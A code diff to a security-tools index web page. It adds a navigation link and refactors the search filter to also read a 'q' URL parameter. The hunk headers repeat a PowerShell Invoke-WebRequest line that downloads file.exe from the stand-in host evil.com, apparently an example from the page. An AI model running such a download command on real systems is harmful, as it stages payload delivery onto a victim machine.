@@ -11,6 +11,7 @@
     <div class="nav-bar">
         <a href="index.html">Home</a>
         <a href="tools.html" class="active">Tools</a>
+        <a href="resources.html">Resources</a>
     </div>
     <h1>Security Tools Index</h1>
     <p>A curated list of SOC, OSINT, and Offensive Security tools.</p>
@@ -303,9 +304,8 @@ Invoke-WebRequest -Uri "http://evil.com/file.exe" -OutFile "C:\Temp\file.exe"
     const searchInput = document.getElementById('searchInput');
     const toolCards = document.querySelectorAll('.tool-card');
 
-    searchInput.addEventListener('input', (e) => {
-        const searchTerm = e.target.value.toLowerCase();
-
+    function filterTools(searchTerm) {
+        searchTerm = searchTerm.toLowerCase();
         toolCards.forEach(card => {
             const title = card.querySelector('.tool-title').textContent.toLowerCase();
             const keywords = card.getAttribute('data-keywords') ? card.getAttribute('data-keywords').toLowerCase() : '';
@@ -318,6 +318,18 @@ Invoke-WebRequest -Uri "http://evil.com/file.exe" -OutFile "C:\Temp\file.exe"
                 card.classList.add('hidden');
             }
         });
+    }
+
+    // Check for query parameter
+    const urlParams = new URLSearchParams(window.location.search);
+    const query = urlParams.get('q');
+    if (query) {
+        searchInput.value = query;
+        filterTools(query);
+    }
+
+    searchInput.addEventListener('input', (e) => {
+        filterTools(e.target.value);
     });
   </script>
 </body>
